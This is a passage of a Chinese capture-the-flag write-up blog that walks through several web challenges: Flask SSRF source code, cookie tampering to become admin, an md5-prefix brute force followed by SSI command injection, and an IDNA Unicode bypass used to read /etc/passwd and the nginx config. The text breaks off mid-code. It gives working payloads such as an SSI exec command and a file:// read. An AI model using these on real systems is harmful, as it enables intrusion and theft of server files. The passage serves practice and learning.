class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">&#x27;latin1&#x27;</span>)</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">secert_key = os.urandom(<span class="number">16</span>)</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Task</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, action, param, sign, ip</span>):</span><br><span class="line">        self.action = action</span><br><span class="line">        self.param = param</span><br><span class="line">        self.sign = sign</span><br><span class="line">        self.sandbox = md5(ip)</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">not</span> os.path.xists(self.sandbox)):          <span class="comment">#SandBox For Remote_Addr</span></span><br><span class="line">            os.mkdir(self.sandbox)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">Exec</span>(<span class="params">self</span>):</span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">        <span class="keyword">if</span> (self.checkSign()):</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;scan&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                tmpfile = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"></span><br><span class="line">                resp = scan(self.param)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (resp == <span class="string">&quot;Connection Timeout&quot;</span>):</span><br><span class="line"></span><br><span class="line">                    result[<span class="string">&#x27;data&#x27;</span>] = resp</span><br><span class="line"></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">                    <span class="built_in">print</span> resp</span><br><span class="line"></span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line"></span><br><span class="line">                    tmpfile.close()</span><br><span class="line"></span><br><span class="line">                result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;read&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line"></span><br><span class="line">                f = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line"></span><br><span class="line">                result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line"></span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = f.read()</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> result[<span class="string">&#x27;code&#x27;</span>] == <span class="number">500</span>:</span><br><span class="line"></span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = <span class="string">&quot;Action Error&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">            result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line"></span><br><span class="line">            result[<span class="string">&#x27;msg&#x27;</span>] = <span class="string">&quot;Sign Error&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">checkSign</span>(<span class="params">self</span>):</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (getSign(self.action, self.param) == self.sign):</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#generate Sign For Action Scan.</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/geneSign&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">geneSign</span>():</span><br><span class="line"></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>)) <span class="comment">#urllib.unquote 是url解码   ----urlib.urlencode 是url编码  #request.args.get获取单个值</span></span><br><span class="line"></span><br><span class="line">    action = <span class="string">&quot;scan&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/De1ta&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge</span>():</span><br><span class="line"></span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">&quot;action&quot;</span>))</span><br><span class="line"></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line"></span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">&quot;sign&quot;</span>))</span><br><span class="line"></span><br><span class="line">    ip = request.remote_addr <span class="comment">#获取request的ip</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(waf(param)):</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No Hacker!!!!&quot;</span></span><br><span class="line"></span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(<span class="string">&quot;code.txt&quot;</span>,<span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">scan</span>(<span class="params">param</span>):</span><br><span class="line"></span><br><span class="line">    socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> urllib.urlopen(param).read()[:<span class="number">50</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Connection Timeout&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getSign</span>(<span class="params">action, param</span>):</span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">md5</span>(<span class="params">content</span>):</span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(content).hexdigest()</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">param</span>):</span><br><span class="line">    check=param.strip().lower()</span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">&quot;gopher&quot;</span>) <span class="keyword">or</span> check.startswith(<span class="string">&quot;file&quot;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.debug = <span class="literal">False</span></span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里话题目就是考点</p><p>这里的代码有点长，就得考察代码审计能力了</p><p><a href="https://www.cnblogs.com/LEOGG321/p/13406418.html">详细的wp</a>   看这个wp就行了，这里就不多写了</p><h2 id="BSidesCF-2019-Kookie"><a href="#BSidesCF-2019-Kookie" class="headerlink" title="[BSidesCF 2019]Kookie"></a>[BSidesCF 2019]Kookie</h2><p>题目</p><p><img src="../images/image-20230410200301423.png" alt="image-20230410200301423"></p><p>这里跟据题目名字猜测跟cookie有关</p><p>抓包输入题目给的账号密码</p><p>然后登录成功</p><p><img src="../images/image-20230410200634909.png" alt="image-20230410200634909"></p><p>发现内容为username=cookie的键值对。</p><p>显然这里Cookie中的键值对的值作为了服务端在用户通过账户密码登录之后再次访问时验证身份的凭证，将其值改为admin也就标志我们成为了admin用户，接着再携带修改后的Cookie访问页面就能获得flag。</p><p><img src="../images/image-20230410201052297.png" alt="image-20230410201052297"></p><h2 id="BJDCTF2020-EasySearch"><a href="#BJDCTF2020-EasySearch" class="headerlink" title="[BJDCTF2020]EasySearch"></a>[BJDCTF2020]EasySearch</h2><p>题目</p><p><img src="../images/image-20230410201152027.png" alt="image-20230410201152027"></p><p>题目上要search</p><p>那么我们就扫一下目录</p><p><strong>扫后台发现index.php.swp备份。</strong></p><p><img src="../images/image-20230410201336318.png" alt="image-20230410201336318"></p><p><strong>一段代码</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ob_start</span>();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_hash</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="variable">$chars</span> = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-&#x27;</span>;</span><br><span class="line"><span class="variable">$random</span> = <span class="variable">$chars</span>[<span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>,<span class="number">73</span>)].<span class="variable">$chars</span>[<span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>,<span class="number">73</span>)].<span class="variable">$chars</span>[<span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>,<span class="number">73</span>)].<span class="variable">$chars</span>[<span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>,<span class="number">73</span>)].<span class="variable">$chars</span>[<span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>,<span class="number">73</span>)];<span class="comment">//Random 5 times</span></span><br><span class="line"><span class="variable">$content</span> = <span class="title function_ invoke__">uniqid</span>().<span class="variable">$random</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">sha1</span>(<span class="variable">$content</span>); </span><br><span class="line">&#125;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);</span><br><span class="line">***</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) <span class="keyword">and</span> <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] != <span class="string">&#x27;&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$admin</span> = <span class="string">&#x27;6d0bc1&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> ( <span class="variable">$admin</span> == <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]),<span class="number">0</span>,<span class="number">6</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;[+] Welcome to manage system&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">            <span class="variable">$file_shtml</span> = <span class="string">&quot;public/&quot;</span>.<span class="title function_ invoke__">get_hash</span>().<span class="string">&quot;.shtml&quot;</span>;</span><br><span class="line">            <span class="variable">$shtml</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$file_shtml</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Unable to open file!&quot;</span>);</span><br><span class="line">            <span class="variable">$text</span> = <span class="string">&#x27;</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">            &lt;h1&gt;Hello,&#x27;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>].<span class="string">&#x27;&lt;/h1&gt;</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">***&#x27;</span>;</span><br><span class="line">            <span class="title function_ invoke__">fwrite</span>(<span class="variable">$shtml</span>,<span class="variable">$text</span>);</span><br><span class="line">            <span class="title function_ invoke__">fclose</span>(<span class="variable">$shtml</span>);</span><br><span class="line">            ***</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;[!] Header  error ...&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;[!] Failed&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">            </span><br><span class="line">    &#125;<span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">***</span><br><span class="line">    &#125;</span><br><span class="line">***</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>要求password的md5值的前6个字符为6d0bc1。敲代码（python）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10000000</span>):</span><br><span class="line">    <span class="keyword">if</span> md5(<span class="built_in">str</span>(i).encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()[:<span class="number">6</span>] == <span class="string">&#x27;6d0bc1&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230410201840174.png" alt="image-20230410201840174"></p><p>发现三个数字可以是</p><p>然后进行登录</p><p><img src="../images/image-20230410201946697.png" alt="image-20230410201946697"></p><p>登录成功</p><p><img src="../images/image-20230410202019909.png" alt="image-20230410202019909"></p><p>发现请求头有个玩意</p><p><img src="../images/image-20230410202059718.png" alt="image-20230410202059718"></p><p>这里有个shtml的玩意</p><p>（shtml是一种基于SSI技术的文件。SSI 注入全称Server-Side Includes Injection，即服务端包含注入。SSI 是类似于 CGI，用于动态页面的指令。SSI 注入允许远程在 Web 应用中注入脚本来执行代码。SSI是嵌入HTML页面中的指令，在页面被提供时由服务器进行运算，以对现有HTML页面增加动态生成的内容，而无须通过CGI程序提供其整个页面，或者使用其他动态技术。从技术角度上来说，SSI就是在HTML文件中，可以通过注释行调用的命令或指针，即允许通过在HTML页面注入脚本或远程执行任意代码。IIS和Apache都可以开启SSI功能）</p><p>（SSI注入的条件：</p><p>1.Web 服务器已支持SSI（服务器端包含）</p><p>2.Web 应用程序未对对相关SSI关键字做过滤</p><p>3.Web 应用程序在返回响应的HTML页面时，嵌入用户输入）</p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--#exec cmd=&quot;命令&quot;--&gt;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230410202410577.png" alt="image-20230410202410577"></p><p>这里就是shtml的注入点了，所以username就是注入点了</p><p>(也可以这样想，只有两个参数可控，passwd已经定死了，那么就只剩username可用了)</p><p><img src="../images/image-20230410202836563.png" alt="image-20230410202836563"></p><p><img src="../images/image-20230410202858401.png" alt="image-20230410202858401"></p><p>这里的话是一下一下给试出来的</p><p>分析一下代码逻辑就知道咋做了</p><h2 id="SUCTF-2019-Pythonginx"><a href="#SUCTF-2019-Pythonginx" class="headerlink" title="[SUCTF 2019]Pythonginx"></a>[SUCTF 2019]Pythonginx</h2><p>题目</p><p><img src="../images/image-20230410203011922.png" alt="image-20230410203011922"></p><p>代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/getUrl&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getUrl</span>():</span><br><span class="line">    url = request.args.get(<span class="string">&quot;url&quot;</span>)</span><br><span class="line">    host = parse.urlparse(url).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">&#x27;suctf.cc&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;我扌 your problem? 111&quot;</span></span><br><span class="line">    parts = <span class="built_in">list</span>(urlsplit(url))</span><br><span class="line">    host = parts[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">&#x27;suctf.cc&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;我扌 your problem? 222 &quot;</span> + host</span><br><span class="line">    newhost = []</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> host.split(<span class="string">&#x27;.&#x27;</span>):</span><br><span class="line">        newhost.append(h.encode(<span class="string">&#x27;idna&#x27;</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    parts[<span class="number">1</span>] = <span class="string">&#x27;.&#x27;</span>.join(newhost)</span><br><span class="line">    <span class="comment">#去掉 url 中的空格</span></span><br><span class="line">    finalUrl = urlunsplit(parts).split(<span class="string">&#x27; &#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">    host = parse.urlparse(finalUrl).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">&#x27;suctf.cc&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.request.urlopen(finalUrl).read()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;我扌 your problem? 333&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230410212124359.png" alt="image-20230410212124359"></p><p><strong>这里看不太懂就直接把代码分离出来看</strong></p><p>利用点在这里<code>urllib.request.urlopen(finalUrl).read()</code>，只要前两次<code>host != suctf.cc</code>，第三次<code>host == suctf.cc</code>即可</p><p><img src="../images/image-20230410212924771.png" alt="image-20230410212924771"></p><p>而这利用的关键在于<code>newhost.append(h.encode(&#39;idna&#39;).decode(&#39;utf-8&#39;))</code></p><p>编码问题，<code>Unicode</code>的很多字符经过这样的一番编码处理都可以得到正常的字母，脚本<strong>fuzz</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">chars = [<span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;f&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> chars:</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x7f</span>, <span class="number">0x10FFFF</span>):</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">char_i = <span class="built_in">chr</span>(i).encode(<span class="string">&#x27;idna&#x27;</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> char_i == c:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;ASCII: &#123;&#125;   Unicode: &#123;&#125;    Number: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(c, <span class="built_in">chr</span>(i), i))</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230410213251760.png" alt="image-20230410213251760"></p><p>这里的意思就是前两个没有进行这个编码，然后第三个之前就有一个编码，然后就会把原本的unicode编码给变成正常的编码了</p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/getUrl?url=file://𝑆uctf.cc/etc/passwd</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230410213759184.png" alt="image-20230410213759184"></p><p>然后就是找flag位置了</p><p><img src="../images/image-20230410213807929.png" alt="image-20230410213807929"></p><p>给了提示，然后就尝试访问nginx这个配置文件</p><p>Nginx<code>的配置文件网上位置有很多，这里能读取到的是</code>/usr/local/nginx/conf/nginx.conf</p><p><img src="../images/image-20230410213928964.png" alt="image-20230410213928964"></p><p>然后就是读取flag了</p><p><img src="../images/image-20230410214100651.png" alt="image-20230410214100651"></p><p>这就是验证过程了</p><h2 id="0CTF-2016-piapiapia"><a href="#0CTF-2016-piapiapia" class="headerlink" title="[0CTF 2016]piapiapia"></a>[0CTF 2016]piapiapia</h2><p>题目</p><p><img src="../images/image-20230410214141340.png" alt="image-20230410214141340"></p><p><strong>这题考察的不是sql注入</strong>   这登录框确实有点欺骗的味道在</p><p>这个尝试一下常用的php文件，看能不能试出网站的目录</p><ul><li>注册账号<br>看来我们还是得老老实实得注册个账号来登录看看有什么功能点，并且熟悉网站结构。但是在登录页面又没有给出注册按钮，看来我们还得自己猜一下，通常是：/register.php。</li><li>浏览功能<br>登录成功后我们看到是一个上传个人信息的一个页面，看到可以上传图片，第一时间就想到了文件上传漏洞。我还是太年轻了，一波操作后没有饶得过。上传了一个正常的信息，发现跳转到profile.php展示出来我们的信息</li><li>目录扫面<br>功能都试过了，没有可以利用的地方（是我太菜）。我们可以扫一下目录，看看有什么隐藏的文件呀，信息泄露什么的，毕竟CTF很多题型是信息泄露+代码审计嘛。拿出御剑扫描后，浏览网页发现访问太快了，返回429状态码。看了网上大佬们的Writeup发现dirsearch可以扫描出来www.zip，我试了下dirsearch要记得加延时参数。<br>拿到了网站的源码我们的信息收集差不多就完了,我们现在可以在源码中寻找突破点</li></ul><p><img src="../images/image-20230411194146010.png" alt="image-20230411194146010"></p><p>这是注册完登录的界面</p><p>查看扫出来的网站目录   <code>www.zip</code>   得到下面的源码</p><p><img src="../images/image-20230411194253897.png" alt="image-20230411194253897"></p><p><strong>update.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;class.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] == <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Login First&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;phone&#x27;</span>] &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>] &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>] &amp;&amp; <span class="variable">$_FILES</span>[<span class="string">&#x27;photo&#x27;</span>]) &#123;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^\d&#123;11&#125;$/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;phone&#x27;</span>]))</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Invalid phone&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>]))</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Invalid email&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[^a-zA-Z0-9_]/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>]) || <span class="title function_ invoke__">strlen</span>(<span class="variable">$_POST</span>[<span 